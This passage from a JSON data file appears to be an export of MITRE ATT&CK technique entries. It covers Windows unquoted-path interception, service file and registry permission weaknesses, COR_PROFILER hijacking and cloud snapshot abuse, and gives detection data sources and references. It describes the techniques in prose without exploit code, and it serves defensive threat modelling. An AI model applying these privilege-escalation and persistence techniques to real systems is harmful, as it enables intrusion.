        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary’s executable to launch.<!-- raw HTML omitted --><!-- raw HTML omitted -->Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <!-- raw HTML omitted -->C:\\unsafe path with space\\program.exe<!-- raw HTML omitted --> vs. <!-- raw HTML omitted -->”C:\\safe path with space\\program.exe”<!-- raw HTML omitted -->). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <!-- raw HTML omitted -->C:\\program files\\myapp.exe<!-- raw HTML omitted -->, an adversary may create a program at <!-- raw HTML omitted -->C:\\program.exe<!-- raw HTML omitted --> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd",
    "platform": "windows",
    "tid": "T1574.010",
    "technique": "Services File Permissions Weakness",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|services",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/17.html",
        "description": "none",
        "external_id": "CAPEC-17"
      }
    ]
  },
  {
    "id": "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd",
    "platform": "windows",
    "tid": "T1574.010",
    "technique": "Services File Permissions Weakness",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|services",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/17.html",
        "description": "none",
        "external_id": "CAPEC-17"
      }
    ]
  },
  {
    "id": "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd",
    "platform": "windows",
    "tid": "T1574.010",
    "technique": "Services File Permissions Weakness",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|services",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/17.html",
        "description": "none",
        "external_id": "CAPEC-17"
      }
    ]
  },
  {
    "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
    "platform": "windows",
    "tid": "T1574.011",
    "technique": "Services Registry Permissions Weakness",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|services|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Services<!-- raw HTML omitted -->. The information stored under a service’s Registry keys can be manipulated to modify a service’s execution parameters through tools such as the service controller, sc.exe,  <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, or <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also alter Registry keys associated with service failure parameters (such as <!-- raw HTML omitted -->FailureCommand<!-- raw HTML omitted -->) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "Registry Key Security",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Registry Key Security and Access Rights. Retrieved March 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kansa Service related collectors",
        "url": "https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html",
        "description": "Hull, D.. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Tweet Registry Perms Weakness",
        "url": "https://twitter.com/r0wdy_/status/936365549553991680",
        "description": "@r0wdy_. (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
    "platform": "windows",
    "tid": "T1574.011",
    "technique": "Services Registry Permissions Weakness",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|services|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Services<!-- raw HTML omitted -->. The information stored under a service’s Registry keys can be manipulated to modify a service’s execution parameters through tools such as the service controller, sc.exe,  <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, or <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also alter Registry keys associated with service failure parameters (such as <!-- raw HTML omitted -->FailureCommand<!-- raw HTML omitted -->) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "Registry Key Security",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Registry Key Security and Access Rights. Retrieved March 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kansa Service related collectors",
        "url": "https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html",
        "description": "Hull, D.. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Tweet Registry Perms Weakness",
        "url": "https://twitter.com/r0wdy_/status/936365549553991680",
        "description": "@r0wdy_. (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
    "platform": "windows",
    "tid": "T1574.011",
    "technique": "Services Registry Permissions Weakness",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|services|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Services<!-- raw HTML omitted -->. The information stored under a service’s Registry keys can be manipulated to modify a service’s execution parameters through tools such as the service controller, sc.exe,  <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, or <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also alter Registry keys associated with service failure parameters (such as <!-- raw HTML omitted -->FailureCommand<!-- raw HTML omitted -->) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "Registry Key Security",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Registry Key Security and Access Rights. Retrieved March 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kansa Service related collectors",
        "url": "https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html",
        "description": "Hull, D.. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Tweet Registry Perms Weakness",
        "url": "https://twitter.com/r0wdy_/status/936365549553991680",
        "description": "@r0wdy_. (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>) if the victim .NET process executes at a higher permission level, as well as to hook and <a href=\"https://attack.mitre.org/techniques/T1562\">Impair Defenses</a> provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>) if the victim .NET process executes at a higher permission level, as well as to hook and <a href=\"https://attack.mitre.org/techniques/T1562\">Impair Defenses</a> provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>) if the victim .NET process executes at a higher permission level, as well as to hook and <a href=\"https://attack.mitre.org/techniques/T1562\">Impair Defenses</a> provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1",
    "platform": "aws|gcp|azure",
    "tid": "T1578.001",
    "technique": "Create Snapshot",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in <a href=\"https://attack.mitre.org/techniques/T1536\">Revert Cloud Instance</a> where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may <a href=\"https://attack.mitre.org/techniques/T1578/002\">Create Cloud Instance</a>, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Cloud Trail Backup API",
        "url": "https://docs.aws.amazon.com/aws-backup/latest/devguide/logging-using-cloudtrail.html",
        "description": "Amazon. (2020). Logging AWS Backup API Calls with AWS CloudTrail. Retrieved April 27, 2020.",
        "external_id": "none"
      },
      {
